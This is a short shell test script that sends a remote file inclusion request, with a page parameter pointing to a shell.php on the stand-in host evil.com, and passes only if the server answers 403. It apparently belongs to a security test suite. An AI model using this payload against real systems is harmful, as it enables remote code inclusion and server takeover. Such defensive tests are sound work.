#!/bin/sh

. ../common.sh

STATUS=$(curl -sk \
-o /dev/null \
-w "%{http_code}" \
"$HOST/?page=http://evil.com/shell.php")

if [ "$STATUS" = "403" ]; then
    pass "RFI blocked"
else
    fail "RFI returned $STATUS"
fi